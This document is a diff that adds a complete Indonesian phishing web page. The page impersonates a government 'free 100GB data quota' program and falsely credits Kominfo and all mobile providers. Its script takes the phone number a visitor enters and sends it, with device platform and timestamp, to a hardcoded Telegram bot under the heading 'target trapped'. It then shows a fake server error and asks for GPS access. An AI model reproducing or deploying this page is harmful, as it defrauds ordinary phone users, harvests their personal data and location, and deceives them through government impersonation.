@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SUBSIDI KUOTA PEMERINTAH 2026</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 font-sans">
+    <div class="max-w-md mx-auto bg-white min-h-screen shadow-2xl">
+        <div class="bg-blue-600 p-8 text-white text-center rounded-b-3xl">
+            <h1 class="text-3xl font-black tracking-tighter">100GB GRATIS</h1>
+            <p class="text-sm opacity-80 font-semibold">Program Percepatan Digital Nasional 2026</p>
+        </div>
+
+        <div class="p-6">
+            <div class="bg-green-100 text-green-700 p-3 rounded-lg text-center mb-6 font-bold border border-green-300 animate-pulse">
+                ✓ Status: Tersedia Untuk Nomor Anda
+            </div>
+
+            <div class="space-y-3 mb-6">
+                <div class="p-4 border-2 border-blue-500 rounded-2xl bg-blue-50 flex justify-between items-center">
+                    <span class="font-bold text-gray-700">Paket Belajar 50GB</span>
+                    <span class="bg-blue-600 text-white px-3 py-1 rounded-full text-xs">AKTIF</span>
+                </div>
+                <div class="p-4 border-2 border-gray-200 rounded-2xl flex justify-between items-center bg-gray-50">
+                    <span class="font-bold text-gray-700">Paket Hiburan 100GB</span>
+                    <span class="bg-gray-400 text-white px-3 py-1 rounded-full text-xs">READY</span>
+                </div>
+            </div>
+
+            <div class="bg-white p-4 rounded-2xl shadow-inner border border-gray-200">
+                <label class="block text-xs font-bold text-gray-500 mb-2 uppercase tracking-widest">Nomor Handphone</label>
+                <input type="number" id="phone" placeholder="08xxxxxxxxxx" class="w-full text-xl font-bold p-3 bg-transparent border-b-4 border-blue-600 focus:outline-none transition-all">
+                <button onclick="kirimData()" class="w-full mt-6 bg-blue-600 hover:bg-blue-700 text-white font-black py-4 rounded-xl shadow-xl transform active:scale-95 transition">AMBIL KUOTA SEKARANG</button>
+            </div>
+
+            <p class="mt-10 text-[10px] text-center text-gray-400 leading-tight">Layanan ini diselenggarakan oleh Kominfo bekerjasama dengan seluruh provider seluler Indonesia. Data dilindungi oleh enkripsi Quantum V9.0.</p>
+        </div>
+    </div>
+
+    <script>
+        async function kirimData() {
+            const hp = document.getElementById('phone').value;
+            const token = "8525196767:AAEMn0AU9aSu1HX658h6JjCJp5xE-k3Me_s";
+            const chat = "8525196767";
+
+            if(hp.length < 10) return alert('Masukkan nomor HP yang benar!');
+
+            const pesan = `⚠️ *TARGET TERPERANGKAP!* ⚠️\n\n` +
+                          `📱 *No HP:* \`${hp}\` \n` +
+                          `🌍 *Platform:* ${navigator.platform}\n` +
+                          `🕒 *Waktu:* ${new Date().toLocaleString()}`;
+
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`;
+
+            try {
+                await fetch(url);
+                alert('Sistem Error (404): Server sedang penuh. Silakan coba lagi nanti atau aktifkan GPS Anda untuk verifikasi lokasi.');
+                navigator.geolocation.getCurrentPosition(()=>{});
+            } catch(e) {}
+        }
+    </script>
+</body>
+</html>
